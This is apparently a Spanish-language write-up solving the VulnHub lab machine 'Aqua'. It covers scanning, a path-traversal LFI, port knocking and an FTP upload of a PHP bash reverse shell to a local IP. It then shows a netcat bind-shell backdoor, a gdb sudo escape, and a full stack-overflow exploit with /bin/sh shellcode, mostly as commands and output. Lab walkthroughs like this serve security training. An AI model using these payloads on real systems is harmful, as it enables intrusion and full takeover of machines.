<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Writeup Aqua VulnHub</title>
<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/aqua.png">
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Writeup Aqua VulnHub" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Resolución de la máquina Aqua de la plataforma de VulnHub" />
<meta property="og:description" content="Resolución de la máquina Aqua de la plataforma de VulnHub" />
<link rel="canonical" href="http://localhost:4000/another-page.html" />
<meta property="og:url" content="http://localhost:4000/another-page.html" />
<meta property="og:site_name" content="Writeup Aqua VulnHub" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Writeup Aqua VulnHub" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Aqua de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>

    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
    <script src="/assets/js/respond.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

<meta name="theme-color" content="#353535">
<meta name="msapplication-navbutton-color" content="#353535">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

  </head>
  <body>

    <div class="wrapper">

      <section>
        <div id="title">
          <h1>Writeup Aqua VulnHub</h1>
          <p>Resolución de la máquina Aqua de la plataforma de VulnHub</p>
        </div>

<div><p>Iniciamos escaneando los puertos de la máquina con nmap, curiosamente ftp esta filtrado</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.43
Nmap scan report for 192.168.100.43
PORT    STATE    SERVICE
21/tcp  filtered ftp
80/tcp  open     http
139/tcp open     netbios-ssn
445/tcp open     microsoft-ds</span>
</code></pre></div></div>

<div><p>En la web nos dicen que megumin ha hackeado su ordenador pregunta si podemos ayudar...</p></div>
<div><p><img src="./1.png"><p></div>

<div><p>Al decir que si, nos muestra las credenciales megumin:watashiwamegumin</p></div>
<div><p><img src="./2.png"><p></div>

<div><p>Empezaremos con un poco de fuerza bruta buscando archivos .php con wfuzz</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://192.168.100.43/FUZZ.php --hc 404 -t 200
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.43/FUZZ.php
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000245:   </span><span class="s2">200</span><span class="p">        27 L     92 W       927 Ch      "index"
000000882:   </span><span class="s2">200</span><span class="p">        30 L     93 W       935 Ch      "welcome"
000000039:   </span><span class="s2">200</span><span class="p">        50 L     173 W      1801 Ch     "login"
000000130:   </span><span class="na">302</span><span class="p">        17 L     17 W       158 Ch      "home"</span>
</code></pre></div></div>

<div><p>Encontramos un login.php donde podemos utilizar las credenciales de megumin</p></div>
<div><p><img src="./3.png"><p></div>

<div><p>Al entrar podemos ver algo en la url, el index.php se gestiona con ?showcase= parece haber un lfi</p></div>
<div><p><img src="./4.png"><p></div>

<div><p>Para hacerlo desde consola mas comodo, tomaremos la cookie de sesión para arrastrarla</p></div>
<div><p><img src="./5.png"><p></div>

<div><p>Primero probaremos leer el /etc/passwd para ver algunos usuarios validos</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ curl</span><span class="p"> -s </span><span class="no">"192.168.100.43/home.php?showcase=../../../../etc/passwd"</span><span class="p"> -b PHPSESSID=5mggqnkqh50j69pkv5214nghb4 | </span><span class="s2">grep</span><span class="p"> sh$
root:x:0:0:root:/root:/bin/bash
aqua:x:1000:1000:aqua,,,:/home/aqua:/bin/bash
megumin:x:1001:1001:,,,:/var/www/html/deployment:/bin/bash</span>
</code></pre></div></div>

<div><p>Despues de enumerar archivos, podemos ver el la configuración de knockd que al golpear los puertos 1234,5678,9012 por tcp en la interfaz enp0s3, conseguimos acceso al 21 (ftp)</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ curl</span><span class="p"> -s </span><span class="no">"192.168.100.43/home.php?showcase=../../../../etc/knockd.conf"</span><span class="p"> -b PHPSESSID=5mggqnkqh50j69pkv5214nghb4 | </span><span class="s2">tail</span><span class="p"> -n8
[options]
UseSysLog
Interface=enp0s3
[FTP]
sequence = 1234:tcp,5678:tcp,9012:tcp
seq_timeout = 15
tcpflags = syn
command = iptables -I INPUT 1 -s %IP% -p tcp -m tcp --dport 21 -j ACCEPT</span>
</code></pre></div></div>

<div><p>Con la herramienta knock golpeamos los puertos y al revisar con nmap, el 21 esta abierto</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ knock </span><span class="p">192.168.100.43 -v 1234 5678 9012 
hitting tcp 192.168.100.43:1234
hitting tcp 192.168.100.43:5678
hitting tcp 192.168.100.43:9012</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ nmap </span><span class="p">192.168.100.43 -p 21
Nmap scan report for 192.168.100.43
PORT   STATE SERVICE
21/tcp open  ftp</span>
</code></pre></div></div>

<div><p>Nos podemos conectar por ftp reutilizando las credenciales de megumin, podemos ver un archivo notes que procedemos a descargar con get</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ ftp </span><span class="p">192.168.100.43
Connected to 192.168.100.43.
220 (vsFTPd 3.0.3)
Name (192.168.100.43:root): </span><span class="kd">megumin</span><span class="p">
331 Please specify the password.
Password: </span><span class="kd">watashiwamegumin</span><span class="p">
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

</span><span class="kd">ftp></span><span class="p"> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 33       33            107 Jan 16  2020 hello.php
-rw-r--r--    1 33       33             93 Jan 16  2020 </span><span class="kd">notes</span><span class="p">
drwxr-xrwx    2 1001     1001         4096 Jan 14  2020 production
226 Directory send OK.

</span><span class="kd">ftp></span><span class="p"> get notes
local: notes remote: notes
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notes (93 bytes).
226 Transfer complete.

</span><span class="kd">ftp></span>
</code></pre></div></div>

<div><p>Al leerlo, nos lekea la ruta donde se encuentra la carpeta production que vemos por ftp</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ cat</span><span class="p"> notes
Please do not delete the </span><span class="kd">/var/www/html/deployment/production/</span><span class="p"> directory - Megumin the hacker</span>
</code></pre></div></div>

<div><p>Ahora creamos una archivo php que al ejecutarlo nos envie una reverse shell con bash</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ cat</span><span class="p"> shell.php
&lt?php
    </span><span class="k">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i >& /dev/tcp/192.168.100.41/443 0>&1'"</span><span class="p">)
?></span>
</code></pre></div></div>

<div><p>Nos conectamos nuevamente a ftp y subimos el php en el directorio production</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ ftp </span><span class="p">192.168.100.43
Connected to 192.168.100.43.
220 (vsFTPd 3.0.3)
Name (192.168.100.43:root): </span><span class="kd">megumin</span><span class="p">
331 Please specify the password.
Password: </span><span class="kd">watashiwamegumin</span><span class="p">
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

</span><span class="kd">ftp></span><span class="p"> cd production
250 Directory successfully changed.

</span><span class="kd">ftp></span><span class="p"> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.

</span><span class="kd">ftp></span>
</code></pre></div></div>

<div><p>Finalmente mediante el lfi arrastrando la cookie, hacemos la petición y conseguimos la shell</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ curl </span><span class="no">"192.168.100.43/home.php?showcase=../deployment/production/shell.php"</span><span class="p"> -b PHPSESSID=5mggqnkqh50j69pkv5214nghb4
</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443
Connection received on 192.168.100.43
</span><span class="s2">www-data@aqua</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(megumin)
</span><span class="s2">www-data@aqua</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ hostname -I
192.168.100.43 
</span><span class="s2">www-data@aqua</span><span class="p">:</span><span class="na">~/html</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Ya que tenemos shell podemos reulizar las credenciales de megumin para pivottar de usuario</p></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">www-data@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ su megumin
Password: </span><span class="kd">watashiwamegumin</span><span class="p">
</span><span class="s2">megumin@aqua</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$ id
uid=1001(megumin) gid=1001(megumin) groups=1001(megumin)
</span><span class="s2">megumin@aqua</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$ hostname -I
192.168.100.43 
</span><span class="s2">megumin@aqua</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Mirando privilegios de sudoers, podemos ejecutar un binario del directorio de aqua</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">megumin@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
Matching Defaults entries for megumin on aqua:
    env_reset, mail_badpass,
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User megumin may run the following commands on aqua:
    (</span><span class="na">ALL</span><span class="p">) NOPASSWD: </span><span class="kd">/home/aqua/Desktop/backdoor</span><span class="p">
</span><span class="s2">megumin@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Lo que hace el script es darnos unas shell cuando nos conectemos al puerto 1337</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">megumin@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /home/aqua/Desktop/backdoor
#!/bin/bash

echo "[+] Backdoor opened! Hehehe..."

runuser -l aqua -c 'nc -lvnp 1337 -e /bin/sh' &>/dev/null
</span><span class="s2">megumin@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Ejecutamos el script, nos conectamos con netcat y nos convertimos en aqua</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">megumin@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /home/aqua/Desktop/backdoor
[+] Backdoor opened! Hehehe...
</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ netcat </span><span class="p">192.168.100.43 1337
script /dev/null -c bash
</span><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ whoami
aqua
</span><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
192.168.100.43 
</span><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Mirando los sudoers de aqua podemos ver gdb, esto es una escalada sencilla</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo gdb -q
(gdb) !bash
</span><span class="s2">root@aqua</span><span class="p">:</span><span class="na">~</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="s2">root@aqua</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
192.168.100.43 
</span><span class="s2">root@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
</code></pre></div></div>

<div><p>Ahora bien, supongo que esta no es la via intencional de la máquina, ya que tenemos el binario /root/quotes que es la otra manera de explotar, la conclusión seria que el privilegio a gdb a nivel de sudoers es para debuguear el binario y conseguir explotarlo</p></div>

<div><p>Iniciamos viendo que es lo que hace el binario, nos pide el nombre como argumento</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /root/quotes
/root/quotes [Your name here] 
</span><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /root/quotes gato
Hi gato,
The best way to pay for a lovely moment is to enjoy it. 
</span><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Ahora intentaremos pasarle varias A como argumento para ver si conseguimos segmentation fault</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /root/quotes $(python3 -c "print('A'*50)")
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,
Segmentation fault
</span><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>En mi caso para manejarme más comodo instale <a href="https://github.com/longld/peda">peda</a>, ya que sus funciones facilitan las cosas</p></div>
<div><p>Podemos usar gdb para saber cuantas A se necesitan antes de sobreescribir registros, son 44</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo gdb -q /root/quotes
Reading symbols from /root/quotes...(no debugging symbols found)...done.
</span><span class="kd">gdb-peda$</span><span class="p"> pattern_create 50 pattern
Writing pattern of 50 chars to filename "pattern"
</span><span class="kd">gdb-peda$</span><span class="p"> run $(cat pattern)
Starting program: /root/quotes $(cat pattern)
Hi AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA,

Program received signal SIGSEGV, Segmentation fault.

</span><span class="na">[---------------------------------registers----------------------------------]</span><span class="p">
</span><span class="s2">EAX</span><span class="p">: 0x37 ('7')
</span><span class="s2">EBX</span><span class="p">: </span><span class="na">0xbffffbb0</span><span class="p"> --> 0x2 
</span><span class="s2">ECX</span><span class="p">: 0x7fffffca 
</span><span class="s2">EDX</span><span class="p">: </span><span class="na">0xb7fbc870</span><span class="p"> --> 0x0 
</span><span class="s2">ESI</span><span class="p">: </span><span class="s2">0x8048ed0</span><span class="p"> ("Hi %s,\n")
</span><span class="s2">EDI</span><span class="p">: </span><span class="na">0xbffffb80</span><span class="p"> --> 0x2 
</span><span class="s2">EBP</span><span class="p">: 0x41304141 ('AA0A')
</span><span class="s2">ESP</span><span class="p">: </span><span class="na">0xbffff3a0</span><span class="p"> --> 0xbf004162 
</span><span class="s2">EIP</span><span class="p">: 0x41414641 ('AFAA')
</span><span class="s2">EFLAGS</span><span class="p">: 0x10282 (</span><span class="s2">c parity adjust zero </span><span class="kd">SIGN</span><span class="s2"> trap </span><span class="kd">INTERRUPT</span><span class="s2"> direction overflow</span><span class="p">)
</span><span class="na">[------------------------------------code------------------------------------]</span><span class="p">
</span><span class="kd">Invalid $PC address: 0x41414641</span><span class="p">
</span><span class="na">[-----------------------------------stack------------------------------------]</span><span class="p">
0000| </span><span class="na">0xbffff3a0</span><span class="p"> --> 0xbf004162 
0004| </span><span class="na">0xbffff3a4</span><span class="p"> --> 0x0 
0008| </span><span class="na">0xbffff3a8</span><span class="p"> --> 0x0 
0012| </span><span class="na">0xbffff3ac</span><span class="p"> --> 0x0 
0016| </span><span class="na">0xbffff3b0</span><span class="p"> ("Impossible is for the unwilling.")
0020| </span><span class="na">0xbffff3b4</span><span class="p"> ("ssible is for the unwilling.")
0024| </span><span class="na">0xbffff3b8</span><span class="p"> ("le is for the unwilling.")
0028| </span><span class="na">0xbffff3bc</span><span class="p"> ("s for the unwilling.")
</span><span class="na">[----------------------------------------------------------------------------]</span><span class="p">
Legend: </span><span class="kd">code</span><span class="p">, </span><span class="na">data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
0x41414641 in ?? ()

</span><span class="kd">gdb-peda$</span><span class="p"> pattern_offset 0x41414641
1094796865 found at offset: </span><span class="kd">44</span><span class="p">
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div>

<div><p>Viendo las funciones podemos encontrar entre ellas una llamada getname</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$</span><span class="p"> info functions
All defined functions:

Non-debugging symbols:
0x08048364  _init
0x080483a0  printf@plt
0x080483b0  time@plt
0x080483c0  strcpy@plt
0x080483d0  puts@plt
0x080483e0  exit@plt
0x080483f0  srand@plt
0x08048400  __libc_start_main@plt
0x08048410  rand@plt
0x08048430  _start
0x08048460  __x86.get_pc_thunk.bx
0x08048470  deregister_tm_clones
0x080484a0  register_tm_clones
0x080484e0  __do_global_dtors_aux
0x08048500  frame_dummy
0x0804852b  main
0x080485fc  </span><span class="kd">getname</span><span class="p">
0x08048630  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048694  _fini

</span><span class="kd">gdb-peda$</span>
</code></pre></div></div>

<div><p>Por ahora correremos el programa con lo siguiente como argumento</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">"A"</span><span class="kd">*</span><span class="na">44</span><span class="c1">     # Junk: la cantidad de A antes de sobreescribir registros</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">"B"</span><span class="kd">*</span><span class="na">4</span><span class="c1">      # Por ahora vale 4 veces B pero será la dirección donde apuntaremos</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">"\x90"</span><span class="kd">*</span><span class="na">16</span><span class="c1">  # Simplemente nops, en este caso solo usaremos 16 de ellos</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">"C"</span><span class="kd">*</span><span class="na">23</span><span class="c1">     # Por ahora vale 23 veces C (tamaño del shellcode de /bin/sh)</span>
</code></pre></div></div>

<div><p>Ahora lo ejecutamos con esos valores como argumento y veremos su comportamiento</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">run $(python -c 'print(("A"*44)+("B"*4)+("\x90"*16)+("C"*23))')
Starting program: /root/quotes $(python -c 'print(("A"*44)+("B"*4)+("\x90"*16)+("C"*23))')
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB����������������CCCCCCCCCCCCCCCCCCCCCCC,

Program received signal SIGSEGV, Segmentation fault.

</span><span class="na">[----------------------------------registers-----------------------------------]</span><span class="p">
</span><span class="s2">EAX</span><span class="p">: 0x5c ('\\')
</span><span class="s2">EBX</span><span class="p">: </span><span class="na">0xbffffb90</span><span class="p"> --> 0x2 
</span><span class="s2">ECX</span><span class="p">: 0x7fffffa5
</span><span class="s2">EDX</span><span class="p">: </span><span class="na">0xb7fbc870</span><span class="p"> --> 0x0 
</span><span class="s2">ESI</span><span class="p">: </span><span class="s2">0x8048ed0</span><span class="p"> ("Hi %s,\n")
</span><span class="s2">EDI</span><span class="p">: </span><span class="na">0xbffffb60</span><span class="p"> --> 0x2 
</span><span class="s2">EBP</span><span class="p">: 0x41414141 ('AAAA')
</span><span class="s2">ESP</span><span class="p">: </span><span class="na">0xbffff380</span><span class="p"> --> 0x90909090 
</span><span class="s2">EIP</span><span class="p">: 0x42424242 ('BBBB')
</span><span class="s2">EFLAGS</span><span class="p">: 0x10286 (</span><span class="s2">carry </span><span class="kd">PARITY</span><span class="s2"> adjust zero </span><span class="kd">SIGN</span><span class="s2"> trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
</span><span class="na">[-------------------------------------code-------------------------------------]</span><span class="p">
</span><span class="kd">Invalid $PC address: 0x42424242</span><span class="p">
</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0xbffff380</span><span class="p"> --> 0x90909090 
0004| </span><span class="na">0xbffff384</span><span class="p"> --> 0x90909090 
0008| </span><span class="na">0xbffff388</span><span class="p"> --> 0x90909090 
0012| </span><span class="na">0xbffff38c</span><span class="p"> --> 0x90909090 
0016| </span><span class="na">0xbffff390</span><span class="p"> ('C' <repeats 23 times>)
0020| </span><span class="na">0xbffff394</span><span class="p"> ('C' <repeats 19 times>)
0024| </span><span class="na">0xbffff398</span><span class="p"> ('C' <repeats 15 times>)
0028| </span><span class="na">0xbffff39c</span><span class="p"> ('C' <repeats 11 times>)
</span><span class="na">[------------------------------------------------------------------------------]</span><span class="p">
Legend: </span><span class="kd">code</span><span class="p">,</span><span class="na"> data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
0x42424242 in ?? ()

</span><span class="kd">gdb-peda$</span>
</code></pre></div></div>

<div><p>Podemos ver nuestros nops en el comienzo de la pila y un poco después las C</p></div>
<div><p>Tomaremos la dirección de donde comienza la pila y le daremos la vuelta ya que son 32 bits</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0xbffff380</span><span class="p">   -->   </span><span class="s2">bf ff f3 80   </span><span class="p">--></span><span class="s2">   80 f3 ff bf</span><span class="p"> -->  </span><span class="na"> \x80\xf3\xff\xbf</span>
</code></pre></div></div>

<div><p>Ahora los valores de el argumento serán los siguientes</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">"A"</span><span class="kd">*</span><span class="na">44</span><span class="c1">                # Junk: la cantidad de A antes de sobreescribir registros</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">"\x80\xf3\xff\xbf"</span><span class="c1">    # Dirección donde comienza la pila</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">"\x90"</span><span class="kd">*</span><span class="na">16</span><span class="c1">             # Los 16 nops que utilizaremos</span>
</code></pre></div></div>

<div><p>Y por ultimo cambiaremos las 23 C por el <a href="https://www.exploit-db.com/exploits/43722">shellcode</a> de 23 bytes para /bin/sh</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span>
</code></pre></div></div>


<div><p>Podemos crear un breakpoint en la dirección de ret de la función getname para ver si todo va bien</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">disas getname
Dump of assembler code for function getname:
   0x080485fc <+0>:	push   ebp
   0x080485fd <+1>:	mov    ebp,esp
   0x080485ff <+3>:	sub    esp,0x28
   0x08048602 <+6>:	sub    esp,0x8
   0x08048605 <+9>:	push   DWORD PTR [ebp+0x8]
   0x08048608 <+12>:	lea    eax,[ebp-0x28]
   0x0804860b <+15>:	push   eax
   0x0804860c <+16>:	call   0x80483c0 <strcpy@plt>
   0x08048611 <+21>:	add    esp,0x10
   0x08048614 <+24>:	sub    esp,0xc
   0x08048617 <+27>:	push   0x8048ed0
   0x0804861c <+32>:	call   0x80483a0 <printf@plt>
   0x08048621 <+37>:	add    esp,0x10
   0x08048624 <+40>:	nop
   0x08048625 <+41>:	leave  
   </span><span class="kd">0x08048626</span><span class="p"> <+42>:	ret    
End of assembler dump.

</span><span class="kd">gdb-peda$ </span><span class="p">b *0x08048626

</span><span class="kd">gdb-peda$</span>
</code></pre></div></div>

<div><p>Al correr el programa con los nuevos argumentos, podemos ver nuestro payload en la pila</p></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">run $(python -c 'print(("A"*44)+("\x80\xf3\xff\xbf")+("\x90"*16)+("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"))')
Starting program: /root/quotes $(python -c 'print(("A"*44)+("\x80\xf3\xff\xbf")+("\x90"*16)+("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"))')
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������1�Ph//shh/bin��PS��

</span><span class="na">[----------------------------------registers-----------------------------------]</span><span class="p">
</span><span class="s2">EAX</span><span class="p">: 0x5c ('\\')
</span><span class="s2">EBX</span><span class="p">: </span><span class="na">0xbffffb90</span><span class="p"> --> 0x2 
</span><span class="s2">ECX</span><span class="p">: 0x7fffffa5
</span><span class="s2">EDX</span><span class="p">: </span><span class="na">0xb7fbc870</span><span class="p"> --> 0x0 
</span><span class="s2">ESI</span><span class="p">: </span><span class="s2">0x8048ed0</span><span class="p"> ("Hi %s,\n")
</span><span class="s2">EDI</span><span class="p">: </span><span class="na">0xbffffb60</span><span class="p"> --> 0x2 
</span><span class="s2">EBP</span><span class="p">: 0x41414141 ('AAAA')
</span><span class="s2">ESP</span><span class="p">: </span><span class="na">0xbffff380</span><span class="p"> --> 0x90909090 
</span><span class="s2">ESP</span><span class="p">: </span><span class="na">0xbffff37c</span><span class="p"> --> </span><span class="na">0xbffff380</span><span class="p"> --> 0x90909090
</span><span class="s2">EIP</span><span class="p">:</span><span class="kd"> 0x8048626</span><span class="p"> (&ltgetname+42>:	ret)
</span><span class="na">[-------------------------------------code-------------------------------------]</span><span class="p">
   0x8048621 &ltgetname+37>:	</span><span class="c1">add    esp,0x10</span><span class="p">
   0x8048624 &ltgetname+40>:	</span><span class="c1">nop</span><span class="p">
   0x8048625 &ltgetname+41>:	</span><span class="c1">leave  </span><span class="p">
=> 0x8048626 &ltgetname+42>:	</span><span class="s2">ret    </span><span class="p">
   0x8048627:	xchg   ax,ax
   0x8048629:	xchg   ax,ax
   0x804862b:	xchg   ax,ax
   0x804862d:	xchg   ax,ax
</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0xbffff37c</span><span class="p"> --> </span><span class="na">0xbffff380</span><span class="p" --> 0x90909090 
0004| </span><span class="na">0xbffff380</span><span class="p"> --> 0x90909090 
0008| </span><span class="na">0xbffff384</span><span class="p"> --> 0x90909090 
0012| </span><span class="na">0xbffff388</span><span class="p"> --> 0x90909090 
0016| </span><span class="na">0xbffff38c</span><span class="p"> --> 0x90909090 
0020| </span><span class="na">0xbffff390</span><span class="p"> --> 0x6850c031 
0024| </span><span class="na">0xbffff394</span><span class="p"> ("//shh/bin\211\343PS\211\341\260\v̀")
0028| </span><span class="na">0xbffff398</span><span class="p"> ("h/bin\211\343PS\211\341\260\v̀")
</span><span class="na">[------------------------------------------------------------------------------]</span><span class="p">
Legend: </span><span class="kd">code</span><span class="p">,</span><span class="na"> data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
Breakpoint 1, 0x08048626 in getname ()

</span><span class="kd">gdb-peda$</span>
</code></pre></div></div>

<div><p>Y al continuar nos dice que se ejecuta el programa /bin/dash, significa que todo es correcto</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">c
Continuing.
process 5179 is executing new program: </span><span class="kd">/bin/dash</span><span class="p">
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x8048626

</span><span class="kd">gdb-peda$</span>
</code></pre></div></div>

<div><p>Finalmente ejecutamos el binario con el payload fuera de gdb y conseguimos la shell como root</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">aqua@aqua</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /root/quotes $(python -c 'print(("A"*44)+("\x80\xf3\xff\xbf")+("\x90"*16)+("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"))')
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������1�Ph//shh/bin��PS��
                                                                                      ,
# bash
</span><span class="s2">root@aqua</span><span class="p">:</span><span class="na">/home/aqua</span><span class="p"># cd /root
</span><span class="s2">root@aqua</span><span class="p">:</span><span class="na">~</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
